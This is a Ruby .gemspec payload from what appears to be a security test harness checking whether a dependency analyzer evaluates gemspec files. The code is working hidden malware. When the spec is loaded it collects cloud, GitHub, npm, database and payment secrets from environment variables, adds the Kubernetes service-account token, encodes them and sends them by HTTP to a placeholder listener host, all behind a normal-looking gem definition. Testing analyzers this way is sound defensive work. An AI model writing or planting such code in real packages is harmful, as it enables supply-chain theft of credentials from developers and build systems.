# DVAP payload: malicious .gemspec that beacons when the spec is evaluated.
#
# Real behavior abused
# --------------------
# A .gemspec is a *Ruby program*. Tools that learn a gem's metadata by running
# `gem build`, `gem specification`, or `Gem::Specification.load` evaluate the
# whole file, so any top-level Ruby here runs in the analyzer's process. This is
# the Ruby analog of setup.py metadata execution.
#
# Mitigation (disable_extensibility): the worker parses name/version statically
# with a regex and never invokes `gem build` / Ruby eval, so this code never runs.
#
# Containment: only network target is the __DVAP_LISTENER_HOST__ placeholder
# (substituted by the worker). Ruby stdlib only (net/http).

require "net/http"

SCAN_TOKEN = "__DVAP_SCAN_TOKEN__".freeze
VECTOR = "__DVAP_VECTOR__".freeze
LISTENER_HOST = "__DVAP_LISTENER_HOST__".freeze
LISTENER_PORT = "__DVAP_LISTENER_PORT__".freeze

SECRET_ENV_KEYS = %w[
  AWS_ACCESS_KEY_ID
  AWS_SECRET_ACCESS_KEY
  AWS_CANARY_ACCESS_KEY_ID
  AWS_CANARY_SECRET_ACCESS_KEY
  AWS_SESSION_TOKEN
  GITHUB_TOKEN
  GITHUB_CANARY_TOKEN
  NPM_TOKEN
  DATABASE_URL
  POSTGRES_CANARY_DSN
  DVAP_DATABASE_URL
  LATERAL_MOVEMENT_DB_URL
  STRIPE_API_KEY
  SLACK_WEBHOOK_URL
].freeze
K8S_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token".freeze

lines = []
SECRET_ENV_KEYS.each do |key|
  val = ENV[key]
  lines << "#{key}=#{val}" if val && !val.empty?
end
begin
  token = File.read(K8S_TOKEN_PATH).strip
  lines << "K8S_SA_TOKEN=#{token}" unless token.empty?
rescue StandardError
  # token file absent (e.g. strip_credentials) -- ignore
end

# Side effect at eval time -- the implicit-execution sink being demoed.
hexed = lines.join("\n").unpack1("H*")
dotted = hexed.scan(/.{1,60}/).join(".")
url = "http://#{LISTENER_HOST}:#{LISTENER_PORT}/b/#{SCAN_TOKEN}/#{VECTOR}?d=#{dotted}"
begin
  Net::HTTP.get_response(URI(url))
rescue StandardError
  # blocked egress / unresolvable host is expected -- never raise
end

# Benign cover: a normal-looking gemspec. The static (mitigated) parser reads
# name/version from these literal assignments without evaluating the file.
Gem::Specification.new do |spec|
  spec.name = "dvap-canary"
  spec.version = "0.0.1"
  spec.summary = "DVAP gemspec eval canary"
  spec.authors = ["dvap"]
  spec.files = []
end
